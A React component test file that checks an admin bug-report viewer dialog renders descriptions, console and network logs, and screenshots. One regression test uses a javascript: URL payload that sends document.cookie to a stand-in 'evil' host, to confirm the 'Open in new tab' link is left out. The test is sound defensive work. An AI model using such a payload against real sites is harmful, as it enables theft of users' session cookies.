import { render, screen } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";

import { ReportViewerDialog } from "../bug-reports/report-viewers";
import type { AdminBugReportRow } from "../bug-reports/types";

const REPORT: AdminBugReportRow = {
  id: "r1",
  description: "Chat does not persist chatId",
  bugType: "FEATURE_NOT_WORKING",
  status: "unhandled",
  isAnonymous: false,
  userId: "u1",
  reporterName: "Alex Patel",
  createdAt: "2026-05-01T10:00:00.000Z",
  consoleLogs: JSON.stringify([
    { level: "error", message: "boom", timestamp: "2026-05-01T10:00:00.000Z" },
    { level: "log", message: "hello", timestamp: "2026-05-01T10:00:01.000Z" },
  ]),
  networkLogs: JSON.stringify([
    { method: "GET", url: "https://eduai.test/api/chats", status: 500, durationMs: 12 },
  ]),
  screenshot: "data:image/png;base64,iVBORw0KGgo=",
  pageUrl: "https://eduai.test/chat",
};

describe("ReportViewerDialog", () => {
  it("renders nothing when no viewer is open", () => {
    const { container } = render(
      <ReportViewerDialog viewerType={null} report={REPORT} onClose={vi.fn()} />,
    );
    expect(container).toBeEmptyDOMElement();
  });

  it("shows the description viewer", () => {
    render(<ReportViewerDialog viewerType="description" report={REPORT} onClose={vi.fn()} />);
    expect(screen.getByText("Chat does not persist chatId")).toBeInTheDocument();
  });

  it("shows captured console entries", () => {
    render(<ReportViewerDialog viewerType="console" report={REPORT} onClose={vi.fn()} />);
    expect(screen.getByText(/boom/)).toBeInTheDocument();
  });

  it("shows captured network entries", () => {
    render(<ReportViewerDialog viewerType="network" report={REPORT} onClose={vi.fn()} />);
    expect(screen.getByRole("dialog")).toBeInTheDocument();
  });

  it("shows the screenshot", () => {
    render(<ReportViewerDialog viewerType="screenshot" report={REPORT} onClose={vi.fn()} />);
    expect(screen.getByRole("img")).toHaveAttribute("src", REPORT.screenshot);
  });

  it("renders the 'Open in new tab' link for an image data URL", () => {
    render(<ReportViewerDialog viewerType="screenshot" report={REPORT} onClose={vi.fn()} />);
    expect(screen.getByRole("link", { name: /open in new tab/i })).toHaveAttribute(
      "href",
      REPORT.screenshot,
    );
  });

  it("omits the 'Open in new tab' link for a non-image (javascript:) screenshot href (#1570)", () => {
    const malicious = {
      ...REPORT,
      screenshot: "javascript:fetch('//evil/'+document.cookie)",
    };
    render(<ReportViewerDialog viewerType="screenshot" report={malicious} onClose={vi.fn()} />);
    // The image still renders (an <img> never executes javascript:), but the
    // clickable anchor sink is not emitted.
    expect(screen.queryByRole("link", { name: /open in new tab/i })).not.toBeInTheDocument();
  });

  it("tolerates a report whose captured payloads are missing", () => {
    const bare = { ...REPORT, consoleLogs: null, networkLogs: null, screenshot: null };
    render(<ReportViewerDialog viewerType="console" report={bare} onClose={vi.fn()} />);
    expect(screen.getByRole("dialog")).toBeInTheDocument();
  });
});
